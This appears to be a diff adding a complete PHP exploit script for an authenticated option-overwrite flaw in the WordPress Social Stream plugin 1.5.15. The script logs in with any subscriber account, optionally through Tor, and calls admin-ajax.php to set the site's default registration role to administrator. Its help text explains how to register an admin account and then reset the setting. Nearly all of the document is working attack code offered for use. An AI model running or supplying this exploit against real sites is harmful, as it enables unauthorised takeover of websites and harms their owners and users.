@@ -1,0 +1,147 @@
+<?php
+/**
+ * Exploit Title: WordPress Social Stream  Exploit
+ * Google Dork:
+ * Exploit Author: wp0Day.com <contact@wp0day.com>
+ * Vendor Homepage:
+ * Software Link: http://codecanyon.net/item/wordpress-social-stream/2201708?s_rank=15
+ * Version: 1.5.15
+ * Tested on: Debian 8, PHP 5.6.17-3
+ * Type: Authenticated wp_options overwrite
+ * Time line: Found [14-May-2016], Vendor notified [14-May-2016], Vendor fixed: [v1.5.16 19/05/2016 (Current Version)],  [RD:1465606136]
+ */
+
+
+require_once('curl.php');
+//OR
+//include('https://raw.githubusercontent.com/svyatov/CurlWrapper/master/CurlWrapper.php');
+$curl = new CurlWrapper();
+
+
+$options = getopt("t:m:u:p:f:c:",array('tor:'));
+print_r($options);
+$options = validateInput($options);
+
+if (!$options){
+    showHelp();
+}
+
+if ($options['tor'] === true)
+{
+    echo " ### USING TOR ###\n";
+    echo "Setting TOR Proxy...\n";
+    $curl->addOption(CURLOPT_PROXY,"http://127.0.0.1:9150/");
+    $curl->addOption(CURLOPT_PROXYTYPE,7);
+    echo "Checking IPv4 Address\n";
+    $curl->get('https://dynamicdns.park-your-domain.com/getip');
+    echo "Got IP : ".$curl->getResponse()."\n";
+    echo "Are you sure you want to do this?\nType 'wololo' to continue: ";
+    $answer = fgets(fopen ("php://stdin","r"));
+    if(trim($answer) != 'wololo'){
+        die("Aborting!\n");
+    }
+    echo "OK...\n";
+}
+
+
+function logIn(){
+    global $curl, $options;
+    file_put_contents('cookies.txt',"\n");
+    $curl->setCookieFile('cookies.txt');
+    $curl->get($options['t']);
+    $data = array('log'=>$options['u'], 'pwd'=>$options['p'], 'redirect_to'=>$options['t'], 'wp-submit'=>'Log In');
+    $curl->post($options['t'].'/wp-login.php', $data);
+    $status =  $curl->getTransferInfo('http_code');
+    if ($status !== 302){
+        echo "Login probably failed, aborting...\n";
+        echo "Login response saved to login.html.\n";
+        die();
+    }
+    file_put_contents('login.html',$curl->getResponse());
+
+
+}
+
+function exploit(){
+    global $curl, $options;
+    if ($options['m'] == 'admin_on'){
+        echo "\nEnabling Admin mode\n";
+        $data = array('action'=>'dcwss_update', 'option_name'=>'default_role', 'option_value'=>'administrator' );
+        $curl->post($options['t'].'/wp-admin/admin-ajax.php', $data);
+        $resp = $curl->getResponse();
+        echo "Response: ". $resp."\n";
+
+    }
+    if ($options['m'] == 'admin_off'){
+        echo "\nDisabling Admin mode\n";
+        $data = array('action'=>'dcwss_update', 'option_name'=>'default_role', 'option_value'=>'subscriber' );
+        $curl->post($options['t'].'/wp-admin/admin-ajax.php', $data);
+        $resp = $curl->getResponse();
+        echo "Response: ". $resp."\n";
+
+    }
+}
+
+
+logIn();
+exploit();
+
+
+
+function validateInput($options){
+
+    if ( !isset($options['t']) || !filter_var($options['t'], FILTER_VALIDATE_URL) ){
+        return false;
+    }
+    if ( !isset($options['u']) ){
+        return false;
+    }
+    if ( !isset($options['p']) ){
+        return false;
+    }
+    if (!preg_match('~/$~',$options['t'])){
+        $options['t'] = $options['t'].'/';
+    }
+    if (!isset($options['m']) || !in_array($options['m'], array('admin_on','admin_off') ) ){
+        return false;
+    }
+    if ($options['m'] == 'r' && !isset($options['f'])){
+        return false;
+    }
+    $options['tor'] = isset($options['tor']);
+
+    return $options;
+}
+
+
+function showHelp(){
+    global $argv;
+    $help = <<<EOD
+
+    WordPress Social Stream  Expoit Pack
+
+Usage: php $argv[0] -t [TARGET URL] --tor [USE TOR?] -u [USERNAME] -p [PASSWORD] -m [MODE]
+
+       *** You need to have a valid login (customer or subscriber will do) in order to use this "exploit" **
+
+       [TARGET_URL] http://localhost/wordpress/
+       [MODE] admin_on - Sets default role on registration to Administrator
+              admin_off - Sets default role on registration to Subscriber
+
+Exploit Flow: Call the exploit with -m admin_on, and register a user manually.
+              After registration call the exploit agiain with -m admin_off .
+
+
+
+Examples:
+       php $argv[0] -t http://localhost/wordpress --tor=yes -u customer1 -p password -m admin_on
+
+    Misc:
+           CURL Wrapper by Leonid Svyatov <leonid@svyatov.ru>
+           @link http://github.com/svyatov/CurlWrapper
+           @license http://www.opensource.org/licenses/mit-license.html MIT License
+
+EOD;
+    echo $help."\n\n";
+    die();
+}
